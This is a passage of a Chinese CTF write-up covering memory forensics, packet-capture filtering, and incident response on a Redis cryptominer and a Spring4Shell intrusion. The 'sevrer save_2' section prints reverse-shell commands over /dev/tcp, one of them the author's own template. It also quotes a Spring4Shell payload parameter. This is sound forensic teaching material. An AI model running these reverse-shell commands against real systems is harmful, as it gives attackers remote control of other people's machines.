class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                            <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(decryption(<span class="string">&quot;.eJwdylsKAyEMQNGtFEGiUGYBs5VpkRQz04AvjNIPce-t_TyXO9QZ8FK7quQfSd1VF6oJI_3S0HzehEQ4p60Xj43MgPXDHrhIjwc4d4X8wiDOwfNPatwoLhrIAvaAkgulxc87Y2SwWyX0xk6r59CUPJ96qvkFHeUvmg.YpIQkg.65xf8l2g9fXAImkfyihId46KkY4&quot;</span>.encode()))</span><br><span class="line"><span class="comment">#引号内放入cookie，注意不要多了空格什么的</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-20.png"></p>
<p>所以flag为<code>red</code></p>
<p>到此该题型结束</p>
<h2 id="BF-虚拟机"><a href="#BF-虚拟机" class="headerlink" title="BF(虚拟机)"></a>BF(虚拟机)</h2><h3 id="baby-forensics-1"><a href="#baby-forensics-1" class="headerlink" title="baby_forensics_1"></a>baby_forensics_1</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-1.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-2.png"></p>
<p>给了两个文件，一个磁盘镜像，另一个猜测是内存镜像，<code>DiskGenius</code>打开<code>.vmdk</code>（先打开DiskGenius，然后将文件拖进去）</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-3.png"></p>
<p>点解分区发现是加密的</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-4.png"></p>
<p>介绍工具：</p>
<p><code>Volatility</code>是一款非常强大的内存取证工具,它是由来自全世界的数百位知名安全专家合作开发的一套工具, 可以用于<code>windows</code>,<code>linux</code>,<code>mac osx</code>,<code>android</code>等系统内存取证。</p>
<p>使用<code>Volatility</code>查看<code>.vmdk</code>信息未读取到有用的，随后查看<code>.raw</code>的文件，有信息输出</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-5.png"></p>
<p>在windows平台使用不方便，建议在Linux下使用，这里使用win(且本题用的是Python2版本)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f baby_forensics.raw --profile=Win7SP1x64 filescan | grep key </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-6.png"></p>
<p>将这个文件dump下来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f baby_forensics.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003df94070 -D /root/桌面/datasafety</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-7.png"></p>
<p>查看一下内容，直接提交flag是不对的，所以这应该是密文</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E96&lt;6J:Da6g_b_f_gd75a3d4ch4heg4bab66ad5d</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-8.png">    </p>
<p>最后得知这是<code>ROT47</code>加密，<code>CyberChef</code>解密</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-9.png"></p>
<p>所以flag为<code>thekeyis2e80307085fd2b5c49c968c323ee25d5</code></p>
<h3 id="baby-forensics-1-1"><a href="#baby-forensics-1-1" class="headerlink" title="baby_forensics_1"></a>baby_forensics_1</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-11.png"></p>
<p>查看进程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f /root/桌面/datasafety/BF/baby_forensics.raw --profile=Win7SP1x64 --profile=Win7SP1x64 psscan</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-10.png"></p>
<p>把文件dump出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f /root/桌面/datasafety/BF/baby_forensics.raw --profile=Win7SP1x64 --profile=Win7SP1x64 memdump -p 2844 -D /root/桌面/datasafety</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-12.png"></p>
<p>查看该文件，<code>file</code>命令查看文件，属于<code>data</code>类型，我们把它后缀修改为<code>data</code>，使用<code>GIMP</code>打开，先不断调整位移使之有图像的阴影等，然后宽度适当即可，如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-14.png"></p>
<p>所以flag为<code>7598632541</code></p>
<h3 id="baby-forensics-3"><a href="#baby-forensics-3" class="headerlink" title="baby_forensics_3"></a>baby_forensics_3</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-15.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f /root/桌面/datasafety/BF/baby_forensics.raw --profile=Win7SP1x64 psscan</span><br><span class="line">//扫描进程</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-16.png"></p>
<p>因为存在这个进程可以知道它会存在<code>.snt</code>便签文件。我们查一下有没有这个文件</p>
<blockquote>
<p>.SNT 文件大多属于 Microsoft 的 <strong>Sticky Notes</strong> 。 SNT 文件是使用与 Windows 桌面捆绑的 Sticky Notes 笔记应用程序创建的便签。使用win7 打开</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows：</span><br><span class="line">.\volatility.exe -f baby_forensics.raw --profile=Win7SP1x64 filescan | findstr &#x27;.snt&#x27;</span><br><span class="line"></span><br><span class="line">Linux：</span><br><span class="line">vol.py -f baby_forensics.raw --profile=Win7SP1x64 filescan | grep &#x27;.snt&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-17.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-18.png"></p>
<p>将这个<code>.snt</code>便签文件导出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">.\volatility.exe -f baby_forensics.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003dfc3d10 -D ./</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-19.png"></p>
<p>根据上面的路径，将这个文件放到<code>win7</code>的便签目录下（需要将隐藏文件显示才能找到路径），然后打开便笺应用，就可以看到密文，一眼就知道这是<code>AES</code>以<code>base64</code>的格式输出的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">路径：C:\Users\mtrleed\AppData\Roaming\Microsoft\Sticky Notes</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-20.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-21.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX195MCsw0ANs6/Vkjibq89YlmnDdY/dCNKRkixvAP6+B5ImXr2VIqBSp94qfIcjQhDxPgr9G4u++pA==</span><br></pre></td></tr></table></figure>

<p>现在需要我们查找<code>AES</code>的<code>key</code>。这里要用到<code>RS(R-Studio Technician)</code> 一款为数字取证实验室、数据恢复企业或个人提供了一流的专业数据恢复工具集。官网<code>https://www.r-studio.com/zhcn/Data_Recovery_Technician.shtml</code></p>
<p>打开软件，导入镜像文件，这里不显示<code>.raw</code>文件显示的文件类型改为全部</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-24.png"></p>
<p>选中导入的镜像文件，然后选择<code>分区搜索</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-25.png"></p>
<p>搜素完毕点击<code>红色目录</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-26.png"></p>
<p>进入后开始查找</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-27.png"></p>
<p>终于在这找到了疑似密钥key的文件，双击打开，查看</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-22.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-23.png"></p>
<p>密钥为<code>qwerasdf</code>。到<code>CyberChef</code>解密失败，到普通在线网站解密即可<code>https://www.sojson.com/encrypt_aes.html</code>该在线网站只会解base64的，恰巧。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/BF-28.png"></p>
<p>所以flag为<code>flag&#123;ad9bca48-c7b0-4bd6-b6fb-aef90090bb98&#125;</code></p>
<h2 id="TP-TCP流专项"><a href="#TP-TCP流专项" class="headerlink" title="TP(TCP流专项)"></a>TP(TCP流专项)</h2><p>某程序漏洞</p>
<h3 id="tcpdump-1"><a href="#tcpdump-1" class="headerlink" title="tcpdump_1"></a>tcpdump_1</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/TP-1.png"></p>
<p>过滤查看成功与失败的特征</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;login&quot; &amp;&amp; http.request.method==POST</span><br></pre></td></tr></table></figure>

<p>这里是失败的</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/TP-2.png"></p>
<p>那我们根据特征过滤，挨个查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp contains &quot;&#123;\&quot;errCode\&quot;:200&#125;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/TP-3.png"></p>
<p>所以flag为<code>TMjpxFGQwD:123457</code></p>
<h3 id="tcpdump-2"><a href="#tcpdump-2" class="headerlink" title="tcpdump_2"></a>tcpdump_2</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/TP-4.png"></p>
<p>既然是越权，修改某个权限标识符的值达到越权，明显是在这种地方会有不一样</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/TP-5.png"></p>
<p>但是我们不知道谁是被越权的</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/TP-6.png"></p>
<p>既然有<code>userid</code>的改变，又是一样的cookie，那基本可以确定这两个操作存在越权。不知道谁修改谁，我们挨个解密提交，成功的就是flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cookie: accessToken=f412d3a0378d42439ee016b06ef3330c; zyplayertoken=f412d3a0378d42439ee016b06ef3330cQzw=; userid=1</span><br><span class="line">--------------------</span><br><span class="line">Cookie: accessToken=f412d3a0378d42439ee016b06ef3330c; zyplayertoken=f412d3a0378d42439ee016b06ef3330cQzw=; userid=2</span><br><span class="line">--------------------</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/TP-7.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/TP-8.png"></p>
<p>最终提交成功的是<code>userid=1</code>的cookie值得md5</p>
<p>所以flag为<code>383c74db4e32513daaa1eeb1726d7255</code></p>
<h3 id="tcpdump-3"><a href="#tcpdump-3" class="headerlink" title="tcpdump_3"></a>tcpdump_3</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/TP-9.png"></p>
<p>既然是jdbc，那么就会带有关键字，直接过滤，学习一下高效过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp contains &quot;jdbc&quot; and tcp contains &quot;username&quot; and tcp contains &quot;password&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/TP-10.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: zyplayer</span><br><span class="line">password: 1234567</span><br></pre></td></tr></table></figure>

<p>所以flag为<code>zyplayer:1234567</code></p>
<h3 id="tcpdump-4"><a href="#tcpdump-4" class="headerlink" title="tcpdump_4"></a>tcpdump_4</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/TP-11.png"></p>
<p>基本都是考察过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接检索jdbc的payload：</span><br><span class="line">tcp contains &quot;jdbc:&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/TP-12.png"></p>
<p>CVE编号直接将利用的包名和关键字贴上搜索引擎找就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE socketFactoryArg=org.springframework.context.support.ClassPathXmlApplicationContext</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/TP-13.png"></p>
<p>所以flag为<code>CVE-2022-21724:custom.dtd.xml</code></p>
<h3 id="tcpdump-5"><a href="#tcpdump-5" class="headerlink" title="tcpdump_5"></a>tcpdump_5</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/TP-14.png"></p>
<p>又是考察看谁的过滤语句精准，如果是你你会怎么下载呢？Linux中我试过很多种方式，大概率是从<code>github</code>上下载的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tcp contains &quot;wget&quot;</span><br><span class="line">tcp contains &quot;wget&quot; and tcp contains &quot;-i&quot; //wget 通常带这个参数大小写都试试</span><br><span class="line">tcp contains &quot;wget&quot; and tcp contains &quot;github&quot;</span><br><span class="line">tcp contains &quot;curl&quot;</span><br><span class="line">tcp contains &quot;curl&quot; and tcp contains &quot;-o&quot; //curl 通常带这个参数大小写都试试</span><br><span class="line">tcp contains &quot;curl&quot; and tcp contains &quot;github&quot;</span><br><span class="line">tcp contains &quot;git clone&quot;</span><br><span class="line">tcp contains &quot;dowload&quot;</span><br><span class="line">tcp contains &quot;install&quot;</span><br><span class="line">如果没能找到flag，同样的过滤方式对http也来一遍</span><br></pre></td></tr></table></figure>

<p>最终好多个过滤都可以找到对应的流</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">猜中了关键字：</span><br><span class="line">curl</span><br><span class="line">-o</span><br><span class="line">github</span><br><span class="line">download</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/TP-15.png"></p>
<p>其实正常的逻辑是不是拿到权限后也是会先安装<code>fscan</code>扫内网？其实也是可以猜出来的</p>
<p>所以flag为<code>fscan</code></p>
<h2 id="IR-应急响应"><a href="#IR-应急响应" class="headerlink" title="IR(应急响应)"></a>IR(应急响应)</h2><p>挖矿病毒，自启动</p>
<h3 id="IncidentResponse-1"><a href="#IncidentResponse-1" class="headerlink" title="IncidentResponse_1"></a>IncidentResponse_1</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-1.png"></p>
<p>打开压缩包是一个<code>.ova</code>这是一个虚拟机导出文件。VMware可以导入导出ova/ovf虚拟机文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-2.png"></p>
<p>现在我们把它导入虚拟机，VMware打开<code>irTest.ova</code>，中间有一些报错，问题不大，继续即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-3.png">    </p>
<p>使用题目给的账号密码<code>root/IncidentResponsePasswd</code>登录虚拟机，有一说一密码真臭长</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-4.png">    </p>
<p>查看一下<code>root</code>用户最新更新过的记录文件: <code>.bash_history</code>、<code>.viminfo</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-5.png"></p>
<p><code>.bash_history</code>看了有一些修改操作，但是看了看这些文件内容貌似也没发现挖矿痕迹</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-6.png"></p>
<p>vim 一下<code>.viminfo</code>，发现了大量操作<code>redis</code>相关配置（在vim中操作的行为，vim会自己主动记录下来，保存在 ~/.viminfo 文件里）</p>
<p>解法1：</p>
<p>直接进入<code>Redis</code>目录查看进程信息可知，该程序发送数万条 udp 链接，结合之前的 redis 挖矿病毒猜测为该程序。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-13.png"></p>
<p>解法2：</p>
<p>查看</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-7.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-8.png"></p>
<p>查看一下<code>.sh</code>文件。这个命令的意思是:使用redis-server命令来启动redis服务进程。<br>并通过-c参数指定redis服务进程使用的配置文件为/etc/redis/redis.conf</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-9.png">    </p>
<p>接着我们到配置文件看看<code>vim /etc/redis/redis.conf</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-10.png"></p>
<p>这里发现一个url，有个域名<code>donate.v2.xmrig.com:3333</code>，搜索引擎一下，确认为挖矿ip池</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-11.png"></p>
<p>所以挖矿程序的路径为<code>/etc/redis/redis.conf</code>，根据题目要求使用<code>echo -n &#39;strings&#39;|md5sum|cut -d &#39; &#39; -f1</code>获取md5值作为答案</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#x27;/etc/redis/redis.conf&#x27;|md5sum|cut -d &#x27; &#x27; -f1</span><br><span class="line">结果为</span><br><span class="line">91f4c88b7edff9dcd83a9d715ff452a2</span><br></pre></td></tr></table></figure>

<p>以为flag为<code>91f4c88b7edff9dcd83a9d715ff452a2</code></p>
<p>但是不正确，原因是路径不是在配置文件应该是应用服务所在路由，尝试将路径改为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#x27;/etc/redis/redis-server&#x27;|md5sum|cut -d &#x27; &#x27; -f1</span><br><span class="line">结果为</span><br><span class="line">6f72038a870f05cbf923633066e48881</span><br></pre></td></tr></table></figure>

<p>所以flag为<code>6f72038a870f05cbf923633066e48881</code></p>
<h3 id="IncidentResponse-2"><a href="#IncidentResponse-2" class="headerlink" title="IncidentResponse_2"></a>IncidentResponse_2</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-12.png"></p>
<p>上一题就看出来了</p>
<p><code>donate.v2.xmrig.com</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#x27;donate.v2.xmrig.com&#x27;|md5sum|cut -d &#x27; &#x27; -f1</span><br><span class="line">结果为</span><br><span class="line">3fca20bb92d0ed67714e68704a0a4503</span><br></pre></td></tr></table></figure>

<p>所以flag为<code>3fca20bb92d0ed67714e68704a0a4503</code></p>
<h3 id="IncidentResponse-3"><a href="#IncidentResponse-3" class="headerlink" title="IncidentResponse_3"></a>IncidentResponse_3</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-14.png"></p>
<p><code>vim .bash_history</code>查看，发现有执行<code>jar</code>包的操作，随后使用<code>nohup</code>去保存运行的日志了（<code>nohup</code>是Linux和Unix系统中的一个命令，其作用是在终端退出时，让进程在后台继续运行。它的全称为“no hang up”，意为“不挂起”。<code>nohup</code>命令可以让你在退出终端或关闭SSH连接后继续运行命令。）</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-15.png"></p>
<p>根据记录，在<code>/home/app/</code>目录下找到了<code>jar</code>包和日志文件，我们直接查看<code>jar</code>包运行启动后的日志文件<code>nohup.log</code><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-16.png"></p>
<p>这个日志是真的很大，人麻了。最终发现<code>shiro反序列化</code>的迹象</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-17.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#x27;shirodeserialization&#x27;|md5sum|cut -d &#x27;&#x27; -f1</span><br><span class="line">结果为</span><br><span class="line">3ee726cb32f87a15d22fe55fa04c4dcd</span><br></pre></td></tr></table></figure>

<p>所以flag为<code>3ee726cb32f87a15d22fe55fa04c4dcd</code></p>
<h3 id="IncidentResponse-4"><a href="#IncidentResponse-4" class="headerlink" title="IncidentResponse_4"></a>IncidentResponse_4</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-18.png"></p>
<p>解法1：在历史记录里看到过一个特殊的外网ip，没想到就是它</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-19.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#x27;81.70.166.3&#x27;|md5sum|cut -d &#x27;&#x27; -f1</span><br><span class="line">结果为</span><br><span class="line">c76b4b1a5e8c9e7751af4684c6a8b2c9</span><br></pre></td></tr></table></figure>

<p>解法2：</p>
<p>攻击者都植入挖矿程序了，肯定登陆过服务器，直接<code>last</code>查看登录记录</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-20.png"></p>
<p>解法3：</p>
<p>也可以查看Nginx中的访问日志，<code>tail /var/log/nginx/access.log</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-21.png"></p>
<p>所以flag为<code>c76b4b1a5e8c9e7751af4684c6a8b2c9</code></p>
<h3 id="IncidentResponse-5"><a href="#IncidentResponse-5" class="headerlink" title="IncidentResponse_5"></a>IncidentResponse_5</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-22.png"></p>
<p>日志里<code>UserAgent</code>就那么几个，可以一个一个试，最后发现就是最后访问时带的 <code>UserAgent</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-23.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#x27;mozilla/5.0(compatible;baiduspider/2.0;+http://www.baidu.com/search/spider.html)&#x27;|md5sum|cut -d &#x27;&#x27; -f1</span><br><span class="line">结果为</span><br><span class="line">6ba8458f11f4044cce7a621c085bb3c6</span><br></pre></td></tr></table></figure>

<p>所以flag为<code>6ba8458f11f4044cce7a621c085bb3c6</code></p>
<h3 id="IncidentResponse-6"><a href="#IncidentResponse-6" class="headerlink" title="IncidentResponse_6"></a>IncidentResponse_6</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-24.png"></p>
<p><code>authorized_keys</code>不为空，推测攻击者开启了<code>root</code>的SSH私钥登录</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-25.png"></p>
<p>查看一下内容，确认就是</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-26.png"></p>
<p>所路径就是<code>/root/.ssh/authorized_keys</code>md5一下</p>
<p>所以flag为<code>a1fa1b5aeb1f97340032971c342c4258</code></p>
<h3 id="IncidentResponse-7"><a href="#IncidentResponse-7" class="headerlink" title="IncidentResponse_7"></a>IncidentResponse_7</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-27.png"></p>
<p><code>/lib/systemd/system/redis.service</code>这个配置很可疑，一直在重启<code>redis</code>，也就是在不断维持植入的矿机程序</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/IR-28.png"></p>
<p>所以flag为<code>b2c5af8ce08753894540331e5a947d35</code></p>
<h2 id="SS-入侵流量分析"><a href="#SS-入侵流量分析" class="headerlink" title="SS(入侵流量分析)"></a>SS(入侵流量分析)</h2><p>系统被入侵还被植入挖矿病毒</p>
<h3 id="sevrer-save-1"><a href="#sevrer-save-1" class="headerlink" title="sevrer save_1"></a>sevrer save_1</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-1.png"></p>
<p>过滤<code>http</code>，前面都是爆破的干扰流量，直接看到后面</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-3.png"></p>
<p><code>class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_</code>有蹊跷，遇事不决就搜索引擎</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-2.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-4.png"></p>
<p>所以flag为<code>CVE-2022-22965</code></p>
<h3 id="sevrer-save-2"><a href="#sevrer-save-2" class="headerlink" title="sevrer save_2"></a>sevrer save_2</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-5.png"></p>
<p>既然是反弹shell，那肯定有特征，不过也可能base过，尝试过滤一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">平时我写的反弹shell</span><br><span class="line">(&quot;sh -c $@|sh . echo `bash -i &gt;&amp; /dev/tcp/VPS地址/7777 0&gt;&amp;1`&quot;);</span><br></pre></td></tr></table></figure>

<p>随便拿上几个特征过滤</p>
<p><code>http contains &quot;/dev/tcp/&quot;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-6.png"></p>
<p>追踪流发现端倪<code>/bin/sh -i &gt;&amp; /dev/tcp/192.168.43.128/2333 0&gt;&amp;1</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-7.png"></p>
<p>所以flag为<code>192.168.43.128:2333</code></p>
<h3 id="sevrer-save-3"><a href="#sevrer-save-3" class="headerlink" title="sevrer save_3"></a>sevrer save_3</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-8.png"></p>
<p>现在我们要去另一个文件查找，里面似乎包含了计算机的所有数据</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-9.png"></p>
<p><code>/home/guests/</code>下发现一个<code>main</code>文件，是<code>ELF</code>可执行文件（Linux的主要可执行文件格式）</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-10.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SS-11.png"></p>
<p>所以flag为<code>main</code></p>
